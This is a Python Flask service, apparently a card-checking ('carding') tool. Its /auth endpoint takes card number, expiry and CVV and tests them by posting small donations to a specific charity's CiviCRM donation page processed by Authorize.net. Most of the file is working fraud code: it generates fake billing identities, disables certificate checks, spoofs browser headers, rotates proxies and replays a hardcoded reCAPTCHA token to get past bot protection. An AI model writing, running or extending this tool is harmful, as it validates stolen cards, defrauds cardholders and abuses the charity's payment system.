from flask import Flask, request, jsonify
from datetime import datetime
import random
import requests
import logging
import re
import time
import os
import ssl
import urllib3
from urllib3.util.ssl_ import create_urllib3_context
from bs4 import BeautifulSoup
from urllib.parse import urljoin

requests.packages.urllib3.util.connection.HAS_IPV6 = False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

logging.basicConfig(level=logging.INFO, format='%(message)s', datefmt='%H:%M:%S')

TIMEOUT_SECONDS = 15

class IgnoreSSLAdapter(requests.adapters.HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs['ssl_context'] = ctx
        return super().init_poolmanager(*args, **kwargs)

def generate_random_user_data():
    first_names = ["John", "Sarah", "Michael", "Emily", "David", "Jessica", "James", "Lauren", "Robert", "Maria", "William", "Jennifer", "Richard", "Linda", "Joseph", "Patricia"]
    last_names = ["Smith", "Johnson", "Brown", "Taylor", "Wilson", "Davis", "Clark", "Harris", "Miller", "Moore", "Anderson", "Thomas", "Jackson", "White", "Martin"]
    email_domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com", "icloud.com"]
   
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    middle_name = random.choice(first_names)[0]
    email_prefix = f"{first_name.lower()}{random.randint(1000,9999)}"
    email = f"{email_prefix}@{random.choice(email_domains)}"
   
    city = "Minneapolis"
    state_id = "1022"
    postal_code = "55401"
    street_address = f"{random.randint(100, 9999)} Main St"
    phone = f"612-{random.randint(200,999)}-{random.randint(1000,9999)}"
   
    return {'first_name': first_name, 'last_name': last_name, 'middle_name': middle_name, 'email': email, 'city': city, 'state_id': state_id, 'postal_code': postal_code, 'street_address': street_address, 'phone': phone}

def clean_card_number(ccnum): 
    return re.sub(r'\D', '', ccnum)

def get_card_type(ccnum):
    ccnum = clean_card_number(ccnum)
    if ccnum.startswith('4'): return "Visa"
    elif ccnum.startswith('5') and len(ccnum) == 16: return "MasterCard"
    elif ccnum.startswith('3') and len(ccnum) in [15, 16]:
        if ccnum.startswith('34') or ccnum.startswith('37'): return "Amex"
    elif ccnum.startswith('6'): return "Discover"
    return "Unknown"

def create_session(proxy_url=None):
    session = requests.Session()
    session.mount('https://', IgnoreSSLAdapter())
    session.mount('http://', IgnoreSSLAdapter())
   
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    session.headers.update(headers)
   
    if proxy_url:
        if not proxy_url.startswith('http'):
            proxy_url = f'http://{proxy_url}'
        session.proxies = {"http": proxy_url, "https": proxy_url}
       
    return session

def detect_payment_processor(html):
    processors = {'authorize': ['authorize.net', 'authorize', 'paymentech', 'cybersource']}
    for pattern in [r'authorize\.net', r'Authorize\.Net', r'authorizenet']:
        if re.search(pattern, html, re.I): 
            return ['authorize']
    return []

def extract_raw_fields(html, soup, form):
    payload = {}
    inputs = form.find_all('input')
   
    submit_button_name = "_qf_Main_upload"
    submit_button_value = "1"
    for inp in inputs:
        if inp.get('type') in ['submit', 'button', 'image']:
            name = inp.get('name')
            if name and '_qf_' in name:
                submit_button_name = name
                submit_button_value = inp.get('value', '1')
                break
   
    payload['_submit_button_name'] = submit_button_name
    payload['_submit_button_value'] = submit_button_value

    for inp in inputs:
        name = inp.get('name')
        if name:
            payload[name] = {'value': inp.get('value', ''), 'type': inp.get('type', 'text')}

    for sel in form.find_all('select'):
        name = sel.get('name')
        if name:
            selected = sel.find('option', selected=True)
            payload[name] = {'value': selected.get('value', '') if selected else '', 'type': 'select'}

    return payload

def get_form_action_and_payload(session, url, proxy_url):
    try:
        resp = session.get(url, timeout=TIMEOUT_SECONDS, allow_redirects=True)
        if resp.status_code != 200:
            return None, None, None, None, f"Bad HTTP {resp.status_code}"

        html = resp.text
        qfkey = None
        for pattern in [r'name="qfKey"\s+value="([^"]+)"', r'qfKey=([a-zA-Z0-9]+)']:
            match = re.search(pattern, html)
            if match: 
                qfkey = match.group(1)
                break

        if not qfkey:
            return None, None, None, None, "Failed: No qfKey"

        processors = detect_payment_processor(html)
        has_authorize = 'authorize' in processors

        soup = BeautifulSoup(html, 'html.parser')
        form = soup.find('form', id=re.compile(r'Main|main|Contribution', re.I)) or soup.find('form')
        if not form: 
            return None, None, None, None, "Form not found"

        form_action = form.get('action') or re.search(r'<form[^>]*action="([^"]+)"', html)
        form_action = form_action.group(1) if isinstance(form_action, re.Match) else form_action
        if form_action and not form_action.startswith('http'):
            form_action = urljoin(url, form_action)

        payload = extract_raw_fields(html, soup, form)
        return qfkey, form_action, payload, has_authorize, "OK"
       
    except Exception as e:
        return None, None, None, None, str(e)

def parse_response(html, url):
    soup = BeautifulSoup(html, 'html.parser')
    if '_qf_ThankYou_display=true' in url or '_qf_ThankYou_display=1' in url:
        return {'approved': True, 'message': 'Payment complete', 'clean_response': 'Payment complete'}
    
    # ... (kekalkan parse_response asal kau)
    status_divs = soup.find_all('div', class_=re.compile(r'status|alert|error|messages|crm-error', re.I))
    for status_div in status_divs:
        error_text = status_div.get_text(separator=' ', strip=True)
        if error_text and len(error_text) > 3:
            return {'approved': False, 'message': error_text, 'clean_response': error_text}
    
    return {'approved': False, 'message': 'No Error Message Found', 'clean_response': ''}

def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amount, is_confirm=False, new_qfkey=None):
    scheme = get_card_type(ccnum)
    full_year = f"20{yy}" if len(yy) == 2 else yy
    input_month = int(mm)
    final_payload = {}
   
    final_payload["g-recaptcha-response"] = "0cAFcWeA4PqJOMFj5mWJD9PmhlqErXn7af22ptYqSm9PWIfUuWBD4CuqXOChTMG-uxogsiJFzY-zd9ZErdAp8mAMgGVa491KAT417HoBZftbG2aTzzIuzJAYLSzxNXPrDmt8nWhuGeMt66_-KgexQ5WcpNrAQXaUofULifI4N05Xu-aGCbF1BvuU6AQKLs8j_muWRkHZQVYplfzk5PPirHB8en_yuWaKIMceUyBJaF1KcvjAf6dHyu48kaDHdHhoor16NdbkzRS0G6EoFhQm1ktHTFEDkkiFkVS5LWx7BK_MeaaZUpIzjOIAMHL3rX_1M-PwJjAxT_LbQ9sYjVoI_m_8sAKjdRoiHAzgZdyBdytGY9OJEVAUukVHGRU6tO15M9lYYhA5VzK4nD0dWeCfIk15U3TcAwZgdAcV036TnwfZMFfC636oW7SgQ0Q76xPLGYNxYI0JT3TR8nHnW-sqmXk8pZQ-3wR3Zy056eCjt-qyR9a-1hRmvcO-O9OvBPQpoEnT_0kNxXtEjAtbCvYz2iitwZoMX4iA7krPUGYUhku9VEQdyNkR_IW5S-DUypInmpqVy1DR0g7iGE4GccDpimMUHlr9VThWRDLS_mpBvRAVuOsjH7RaahI2xoXWZyIHQ0he2nsI-q-0hdJ_O5UVr1rPzWCYvEGu9ufhE6AhIMz1XKnO5mxHppZ6oCMzAW7jwPgwf4VBSJjWB4ym_YriAPEmq4su1ehRc21xtl03WlPLZyAqIwmSzNc5O6biV-bMVa7BQuBGZOILy4X3qQ-0O0byiscz729xXIN30L4hR5rv7zMP-WctzXSvLxkk9dWS2mpaD3msoBXZP4Ac6SkGf_TvG3YlOOEjfgTNnTT86tVhC11Ni9PXwl9m2kolOe7v_PmMhmgN-jE3IjxFWHxpCfN9_MfQk-jYJQ2s05tgXlPz4kh_4R6AWuuIozqsdIPI676qsiqkKFiQptp_NxaARq3KndEd4eS5Vh8GYEmgBBaE6o_KrWQRTG-E5WuA1X0CcpPLBk6RvroZdQGy9kwInxFEF9u9h4J3ja7tWqOqrnomaGzjC7AM3KoJvE3wXpU6EW_JLHUbXNSDfkjdDWMzM9bfiZ5NsWYnDQtXzHBYYtv6KVD-ziCCwAkG84RUBjLscQkJCe7Wn-Dujhe9W34cw6Sw8eeFroIEPAs_hsnJQabopNAWRNKnK49wYsVkrmV31D3OxGFNuQfFPR-PLzeIYb4yhAuwVehhGeOAFsp0RSVQssODPW6ncHgBXuL5hakVTl9ehyjIcaB6E5QzLrPFjIjGAMRUmaEzWzpO4R5Oq2S0CZZA-QxNInQjvH54iwT5BKbjdZYXY6xA2"

    if is_confirm:
        final_payload["qfKey"] = new_qfkey if new_qfkey else qfkey
        final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
        final_payload["_qf_default"] = "Confirm:next"
        final_payload["_qf_Confirm_next"] = "1"
        final_payload["custom_1"] = full_year
        final_payload["custom_3"] = ""
    else:
        final_payload["qfKey"] = qfkey
        final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
        final_payload["hidden_processor"] = "1"
        final_payload["payment_processor_id"] = "4"
        final_payload["priceSetId"] = "3"
        final_payload["_qf_default"] = "Main:upload"
        final_payload["price_2"] = "10"
        final_payload["email-5"] = user_data['email']
        final_payload["credit_card_type"] = scheme
        final_payload["credit_card_number"] = ccnum
        final_payload["cvv2"] = cvv
        final_payload["credit_card_exp_date[M]"] = str(input_month)
        final_payload["credit_card_exp_date[Y]"] = full_year
        final_payload["billing_first_name"] = user_data['first_name']
        final_payload["billing_last_name"] = user_data['last_name']
        final_payload["billing_street_address-5"] = user_data['street_address']
        final_payload["billing_city-5"] = user_data['city']
        final_payload["billing_country_id-5"] = "1228"
        final_payload["billing_state_province_id-5"] = user_data['state_id']
        final_payload["billing_postal_code-5"] = user_data['postal_code']
       
        submit_name = raw_payload.get('_submit_button_name', '_qf_Main_upload')
        submit_val = raw_payload.get('_submit_button_value', '1')
        final_payload[submit_name] = submit_val

    return final_payload

def process_site_for_payload(url, override_proxy=None):
    session = create_session(override_proxy)
    qfkey, form_action, payload, has_authorize, err_msg = get_form_action_and_payload(session, url, override_proxy)
   
    if err_msg != "OK":
        session.close()
        return {'url': url, 'status': err_msg.lower().replace(' ', '_'), 'payload': None, 'session': None, 'proxy_url': None}
   
    return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': override_proxy}

# ================== CONFIRMATION HANDLING ==================
def extract_confirmation_form(html, soup):
    confirm_form = soup.find('form', {'id': 'Confirm'})
    if not confirm_form:
        for form in soup.find_all('form'):
            if form.find('input', {'name': '_qf_Confirm_next'}) or form.find('button', {'name': '_qf_Confirm_next'}):
                confirm_form = form
                break
    if not confirm_form:
        return None, None, None
    
    new_qfkey_input = confirm_form.find('input', {'name': 'qfKey'})
    new_qfkey = new_qfkey_input['value'] if new_qfkey_input else None
    action = confirm_form.get('action')
    return confirm_form, action, new_qfkey

def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
    base_url = site_data['url']
    raw_payload = site_data['payload']
    form_action = site_data['form_action']
    qfkey = site_data['qfkey']
    
    session = create_session(site_data.get('proxy_url'))
    user_data = generate_random_user_data()
    detected_price = round(random.uniform(1.05, 5.00), 2)

    for attempt in range(3):
        try:
            clean_initial = build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=False)
            
            session.headers.update({
                "Referer": "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1",
                "Origin": "https://www.saharaaa.org"
            })

            post_url = form_action
            if 'qfKey=' not in post_url:
                post_url += ('&' if '?' in post_url else '?') + f'qfKey={qfkey}'

            response = session.post(post_url, data=clean_initial, timeout=TIMEOUT_SECONDS + 5, allow_redirects=True)
            soup_resp = BeautifulSoup(response.text, 'html.parser')

            logging.info(f"URL Selepas Submit Pertama: {response.url}")

            # Extract Confirm Form
            confirm_form, confirm_action, new_qfkey = extract_confirmation_form(response.text, soup_resp)

            if confirm_form:
                confirm_post_url = urljoin("https://www.saharaaa.org/civicrm/contribute/transact/", confirm_action) if confirm_action else response.url
                
                # Build payload dari confirm form
                clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=True, new_qfkey=new_qfkey)
                
                # Tambah hidden fields dari confirm form
                for inp in confirm_form.find_all('input'):
                    name = inp.get('name')
                    if name and name not in clean_confirm:
                        clean_confirm[name] = inp.get('value', '')

                session.headers.update({"Referer": response.url})
                confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 5, allow_redirects=True)
                
                logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
                result = parse_response(confirm_response.text, confirm_response.url)
            else:
                result = parse_response(response.text, response.url)

            if 'session has expired' in result.get('message', '').lower() and attempt < 2:
                time.sleep(1)
                continue

            return result, detected_price

        except Exception as e:
            logging.error(str(e))
            return {'approved': False, 'message': str(e)}, detected_price

    return {'approved': False, 'message': 'Max retry reached'}, detected_price

@app.route('/auth', methods=['GET'])
def handle_auth():
    start_time = time.time()
   
    site = request.args.get('site')
    cc_param = request.args.get('cc')
    proxy_param = request.args.get('proxy')

    if not site or not cc_param:
        return jsonify({"error": "Missing parameters"}), 400

    try:
        parts = cc_param.split('|')
        cc, mm, yy, cvv = parts
    except:
        return jsonify({"error": "Invalid cc format"}), 400

    override_proxy = proxy_param

    try:
        site_data = process_site_for_payload(site, override_proxy)
       
        if site_data['status'] == 'success':
            result, detected_price = process_card_on_site(site_data, cc, mm, yy, cvv, override_proxy)
        else:
            result = {'approved': False, 'message': site_data['status']}
            detected_price = 0.0
    except Exception as e:
        result = {'approved': False, 'message': str(e)}
        detected_price = 0.0

    end_time = time.time()
    time_taken = round(end_time - start_time, 2)
   
    return jsonify({
        "Gateway": "Authorized.net",
        "Price": detected_price,
        "Result": "Approved" if result.get('approved') else "Declined",
        "Response": result.get('message', 'Unknown'),
        "Status": result.get('approved', False),
        "Time": f"{time_taken}s",
        "cc": cc_param
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
